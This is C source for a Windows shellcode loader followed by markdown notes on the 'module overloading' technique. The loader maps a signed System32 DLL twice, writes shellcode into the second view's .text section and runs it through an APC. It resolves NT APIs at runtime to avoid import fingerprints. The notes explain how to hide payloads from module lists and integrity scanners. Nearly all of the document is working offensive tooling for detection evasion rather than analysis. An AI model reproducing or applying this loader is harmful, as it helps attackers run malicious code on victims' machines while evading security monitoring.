 * Technique: Module Overloading (dual SEC_IMAGE mapping of a signed DLL)

/* APC routine: runs shellcode in alertable thread context             */

static VOID CALLBACK ApcRoutine(ULONG_PTR dwParam)
{
    (void)dwParam;
    if (g_payload) {
        ((void (*)(void))g_payload)();
    }
}

/* Thread proc that parks itself in an alertable wait so the queued
 * APC fires. Must return DWORD and take LPVOID per CreateThread. */
static DWORD WINAPI AlertableThreadProc(LPVOID param)
{
    (void)param;
    SleepEx(INFINITE, TRUE);
    return 0;
}

static unsigned char *read_file(const char *path, size_t *out_size)
{
    FILE *fp = NULL;
    long  sz = 0;
    unsigned char *buf = NULL;

    if (fopen_s(&fp, path, "rb") != 0 || fp == NULL) {
        fprintf(stderr, "[-] fopen_s failed for %s\n", path);
        return NULL;
    }
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return NULL; }
    sz = ftell(fp);
    if (sz <= 0) { fclose(fp); fprintf(stderr, "[-] empty file\n"); return NULL; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return NULL; }

    buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) { fclose(fp); return NULL; }
    if (fread(buf, 1, (size_t)sz, fp) != (size_t)sz) {
        free(buf); fclose(fp); return NULL;
    }
    fclose(fp);
    *out_size = (size_t)sz;
    return buf;
}

/* Find a section by name inside a mapped PE image (case-insensitive). */
static PIMAGE_SECTION_HEADER find_section(PIMAGE_NT_HEADERS nt,
                                          const char *name)
{
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    WORD i;
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        char sname[9];
        memcpy(sname, sec->Name, 8);
        sname[8] = '\0';
        if (_stricmp(sname, name) == 0) {
            return sec;
        }
    }
    return NULL;
}

/* Build a full path to a System32 DLL using GetSystemDirectoryW.
 * Never hardcode "C:\Windows\System32". */
static BOOL build_system32_path(const wchar_t *dllName,
                                wchar_t *out, size_t outChars)
{
    UINT n = GetSystemDirectoryW(out, (UINT)outChars);
    if (n == 0 || n >= outChars) return FALSE;
    /* Append backslash if not present, then the DLL name. */
    if (n > 0 && out[n - 1] != L'\\') {
        if (n + 1 >= outChars) return FALSE;
        out[n++] = L'\\';
        out[n]   = L'\0';
    }
    if (wcslen(out) + wcslen(dllName) + 1 > outChars) return FALSE;
    wcscat_s(out, outChars, dllName);
    return TRUE;
}

/* Try to open a cover DLL from System32. Returns a valid HANDLE or
 * INVALID_HANDLE_VALUE. */
static HANDLE open_cover_dll(const wchar_t *dllName, wchar_t *resolvedPath,
                             size_t resolvedChars)
{
    HANDLE h;
    if (!build_system32_path(dllName, resolvedPath, resolvedChars))
        return INVALID_HANDLE_VALUE;

    /* For SEC_IMAGE the file handle MUST have FILE_EXECUTE access
     * (GENERIC_READ | GENERIC_EXECUTE). GENERIC_READ alone yields
     * STATUS_ACCESS_DENIED (0xC0000022) from NtCreateSection. */
    h = CreateFileW(resolvedPath,
                    GENERIC_READ | GENERIC_EXECUTE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    NULL);
    return h;
}

int main(int argc, char *argv[])
{
    unsigned char *shellcode = NULL;
    size_t         shellcode_size = 0;

    HMODULE        hNtdll = NULL;
    pNtCreateSection        NtCreateSection        = NULL;
    pNtMapViewOfSection     NtMapViewOfSection     = NULL;
    pNtUnmapViewOfSection   NtUnmapViewOfSection   = NULL;
    pNtProtectVirtualMemory NtProtectVirtualMemory = NULL;
    pNtClose                NtClose                = NULL;

    HANDLE         hSection = NULL;
    PVOID          viewA = NULL;   /* cover mapping (untouched)        */
    PVOID          viewB = NULL;   /* payload mapping (stomped .text)  */
    SIZE_T         viewSize = 0;

    NTSTATUS       status;
    ULONG          oldProt = 0;
    PVOID          protBase = NULL;
    SIZE_T         protSize = 0;

    DWORD          tid = 0;
    HANDLE         hThread = NULL;

    wchar_t        coverPath[MAX_PATH];
    coverPath[0] = L'\0';

    /* Prefer a large, rarely-executed signed DLL as the cover image.
     * Fall back to amsi.dll if the primary candidate is unavailable. */
    static const wchar_t *coverCandidates[] = {
        L"mshtml.dll",
        L"edgehtml.dll",
        L"amsi.dll"
    };
    size_t ci;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    shellcode = read_file(argv[1], &shellcode_size);
    if (!shellcode) {
        fprintf(stderr, "[-] failed to read shellcode\n");
        return 1;
    }
    printf("[+] shellcode size: %zu bytes\n", shellcode_size);

    /* ---- Resolve NT APIs dynamically (no IAT fingerprint) ---- */
    hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        fprintf(stderr, "[-] ntdll not found\n");
        free(shellcode);
        return 1;
    }
    NtCreateSection        = (pNtCreateSection)        GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection     = (pNtMapViewOfSection)     GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection   = (pNtUnmapViewOfSection)   GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    NtProtectVirtualMemory = (pNtProtectVirtualMemory) GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    NtClose                = (pNtClose)                GetProcAddress(hNtdll, "NtClose");

    if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection ||
        !NtProtectVirtualMemory || !NtClose) {
        fprintf(stderr, "[-] failed to resolve ntdll exports\n");
        free(shellcode);
        return 1;
    }

    /* ---- Open a cover DLL from the real System32 directory ---- */
    for (ci = 0; ci < sizeof(coverCandidates) / sizeof(coverCandidates[0]); ci++) {
        hFile = open_cover_dll(coverCandidates[ci], coverPath, MAX_PATH);
        if (hFile != INVALID_HANDLE_VALUE) {
            printf("[+] using cover image: %ls\n", coverPath);
            break;
        }
    }
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] could not open any cover DLL from System32: %lu\n",
                GetLastError());
        free(shellcode);
        return 1;
    }

    /* ---- Create a SEC_IMAGE section from the DLL ---- */
    /* For SEC_IMAGE: do NOT request SECTION_MAP_WRITE. Use
     * SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY. */
    status = NtCreateSection(&hSection,
                             SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY,
                             NULL,
                             NULL,
                             PAGE_EXECUTE_READ,
                             SEC_IMAGE,
                             hFile);
    CloseHandle(hFile);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] NtCreateSection failed: 0x%08lX\n", (unsigned long)status);
        free(shellcode);
        return 1;
    }

    /* ---- Map view A (clean cover, untouched) ---- */
    viewSize = 0;
    viewA = NULL;
    status = NtMapViewOfSection(hSection,
                                GetCurrentProcess(),
                                &viewA,
                                0,
                                0,
                                NULL,
                                &viewSize,
                                1 /* ViewUnmap */,
                                0,
                                PAGE_READONLY);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] NtMapViewOfSection(A) failed: 0x%08lX\n", (unsigned long)status);
        NtClose(hSection);
        free(shellcode);
        return 1;
    }
    printf("[+] cover mapping A at %p (size 0x%zX)\n", viewA, viewSize);

    /* ---- Map view B (payload host) ---- */
    {
        SIZE_T viewBSize = 0;
        viewB = NULL;
        status = NtMapViewOfSection(hSection,
                                    GetCurrentProcess(),
                                    &viewB,
                                    0,
                                    0,
                                    NULL,
                                    &viewBSize,
                                    1 /* ViewUnmap */,
                                    0,
                                    PAGE_READONLY);
        if (!NT_SUCCESS(status)) {
            fprintf(stderr, "[-] NtMapViewOfSection(B) failed: 0x%08lX\n", (unsigned long)status);
            NtUnmapViewOfSection(GetCurrentProcess(), viewA);
            NtClose(hSection);
            free(shellcode);
            return 1;
        }
        printf("[+] payload mapping B at %p (size 0x%zX)\n", viewB, viewBSize);
    }

    /* ---- Locate .text in view B and copy the payload there ---- */
    {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)viewB;
        PIMAGE_NT_HEADERS nt;
        PIMAGE_SECTION_HEADER text;
        BYTE *textBase;
        SIZE_T textSize;

        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
            fprintf(stderr, "[-] bad DOS header in mapped image\n");
            goto cleanup;
        }
        nt = (PIMAGE_NT_HEADERS)((BYTE *)viewB + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) {
            fprintf(stderr, "[-] bad NT header in mapped image\n");
            goto cleanup;
        }

        text = find_section(nt, ".text");
        if (!text) {
            fprintf(stderr, "[-] .text section not found\n");
            goto cleanup;
        }
        textBase = (BYTE *)viewB + text->VirtualAddress;
        textSize = text->Misc.VirtualSize;

        if (shellcode_size > textSize) {
            fprintf(stderr, "[-] payload (%zu) larger than .text (%zu)\n",
                    shellcode_size, textSize);
            goto cleanup;
        }

        /* Flip .text to RW so we can copy, then back to RX (RW_to_RX). */
        protBase = textBase;
        protSize = textSize;
        status = NtProtectVirtualMemory(GetCurrentProcess(),
                                        &protBase,
                                        &protSize,
                                        PAGE_READWRITE,
                                        &oldProt);
        if (!NT_SUCCESS(status)) {
            fprintf(stderr, "[-] NtProtectVirtualMemory(RW) failed: 0x%08lX\n",
                    (unsigned long)status);
            goto cleanup;
        }

        memcpy(textBase, shellcode, shellcode_size);

        status = NtProtectVirtualMemory(GetCurrentProcess(),
                                        &protBase,
                                        &protSize,
                                        PAGE_EXECUTE_READ,
                                        &oldProt);
        if (!NT_SUCCESS(status)) {
            fprintf(stderr, "[-] NtProtectVirtualMemory(RX) failed: 0x%08lX\n",
                    (unsigned long)status);
            goto cleanup;
        }

        g_payload = (PVOID)textBase;
        printf("[+] payload staged at %p (module-backed, RX)\n", g_payload);
    }

    /* ---- Execute via local APC on an alertable thread ---- */
    hThread = CreateThread(NULL, 0, AlertableThreadProc, NULL,
                           CREATE_SUSPENDED, &tid);
    if (!hThread) {
        fprintf(stderr, "[-] CreateThread failed: %lu\n", GetLastError());
        goto cleanup;
    }

    if (QueueUserAPC((PAPCFUNC)ApcRoutine, hThread, 0) == 0) {
        fprintf(stderr, "[-] QueueUserAPC failed: %lu\n", GetLastError());
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        goto cleanup;
    }

    ResumeThread(hThread);

    /* Wait for the payload thread to finish (calc will exit quickly). */
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

cleanup:
    if (viewB) NtUnmapViewOfSection(GetCurrentProcess(), viewB);
    if (viewA) NtUnmapViewOfSection(GetCurrentProcess(), viewA);
    if (hSection) NtClose(hSection);
    if (shellcode) free(shellcode);
    return 0;
}

### Memory Techniques

### module_overloading [USER-PREFERRED]
# Module Overloading (Double Mapping)

## Concept
Map the **same DLL twice**: once normally (as the visible, clean cover module that appears in PEB loader lists) and once as a private/modified copy that hosts the payload. Scanners enumerating modules see the clean mapping; the payload actually executes from the second mapping — or the technique is used to keep a module *listed* that actually serves different code than its file.

## Variants
1. **Dual-map stomping**: `CreateFileMapping`/`NtMapViewOfSection` twice on the same DLL path — write payload into mapping B, keep mapping A pristine. Module lists show path X (clean in list view), execution happens in B.
2. **Classic module overloading**: allocate `SizeOfImage` for DLL X at our own address, copy X's headers+sections, then write payload *into* that private copy — the private region isn't a normal module entry but carries X's legitimate headers/imports.
3. **PEB-list lying**: add/remove InMemoryOrderModuleList entries so the loaded module enumeration reports a different story than VAD/private memory shows.

## Why it may matter
- Module-integrity checks that compare `module on disk` vs `module in memory` get confused about *which* mapping is authoritative.
- Unlike plain stomping, the "cover" mapping stays byte-identical to disk — integrity re-scan passes while code runs elsewhere.

## Steps (dual-map)
1. `CreateFileW`/`NtCreateFile` on chosen DLL → `CreateFileMappingW` (or `NtCreateSection SEC_IMAGE`) → `NtMapViewOfSection` twice.
2. Keep view A untouched (cover); write payload into view B's `.text` (or tail slack space) and execute from B.
3. Optional: unlink B from loader list or rewrite its name entry.

## Pitfalls
- Two VAD entries for the same file is itself anomalous — VAD-scanners can flag "same file mapped twice with differing content."
- Executing from view B still needs B mapped RX — `SEC_IMAGE` maps come in already RX; a second *file* mapping (`PAGE_READWRITE`) is NOT executable — prefer two SEC_IMAGE views and stomp only one.
- Region size must cover the payload; pick a DLL with slack.
